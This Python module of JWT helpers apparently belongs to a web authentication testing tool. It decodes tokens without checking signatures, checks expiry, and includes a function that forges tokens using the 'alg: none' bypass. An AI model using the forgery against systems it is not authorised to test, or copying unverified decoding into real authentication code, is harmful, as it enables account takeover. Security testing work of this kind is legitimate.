"""
Security utilities — JWT decoding, token validation, auth helpers.
Used by the Broken Auth attack module and the auth handler.
"""

from datetime import datetime, timezone
from typing import Any, Dict, Optional

from jose import jwt, JWTError


def decode_jwt_unverified(token: str) -> Dict[str, Any]:
    """
    Decode a JWT *without* signature verification.
    Useful for inspecting claims (exp, sub, roles) during recon.
    """
    try:
        header = jwt.get_unverified_header(token)
        claims = jwt.get_unverified_claims(token)
        return {
            "header": header,
            "claims": claims,
            "valid": True,
            "error": None,
        }
    except JWTError as e:
        return {
            "header": None,
            "claims": None,
            "valid": False,
            "error": str(e),
        }


def check_jwt_expiry(token: str) -> Dict[str, Any]:
    """Check whether a JWT's 'exp' claim is present and not expired."""
    decoded = decode_jwt_unverified(token)
    if not decoded["valid"]:
        return {"expired": None, "error": decoded["error"]}

    claims = decoded["claims"]
    exp = claims.get("exp")

    if exp is None:
        return {"expired": None, "missing_exp": True, "error": "No exp claim in token"}

    exp_dt = datetime.fromtimestamp(exp, tz=timezone.utc)
    now = datetime.now(tz=timezone.utc)

    return {
        "expired": now > exp_dt,
        "exp_timestamp": exp,
        "exp_datetime": exp_dt.isoformat(),
        "missing_exp": False,
        "error": None,
    }


def try_none_algorithm(token: str) -> Optional[str]:
    """
    Attempt the 'alg: none' attack — re-sign the JWT with no algorithm.
    Returns the forged token string, or None if the library blocks it.
    """
    decoded = decode_jwt_unverified(token)
    if not decoded["valid"]:
        return None

    try:
        forged = jwt.encode(decoded["claims"], key="", algorithm="none")
        return forged
    except (JWTError, Exception):
        return None
